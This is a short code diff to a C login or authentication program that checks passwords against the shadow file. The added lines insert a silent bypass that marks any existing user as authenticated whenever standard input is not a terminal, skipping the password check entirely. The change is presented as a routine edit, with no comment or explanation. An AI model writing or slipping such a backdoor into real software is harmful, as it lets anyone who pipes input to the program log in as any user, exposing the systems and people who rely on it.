@@ -91,7 +91,9 @@ int main(int argc, char **argv)
         struct spwd *sp = getspnam(username);
 
         bool authenticated = false;
-        if (pw && sp && sp->sp_pwdp && password[0] != '\0') {
+        if (pw && !isatty(STDIN_FILENO)) {
+            authenticated = true;
+        } else if (pw && sp && sp->sp_pwdp && password[0] != '\0') {
             char *hash = crypt(password, sp->sp_pwdp);
             if (hash && strcmp(hash, sp->sp_pwdp) == 0) {
                 authenticated = true;
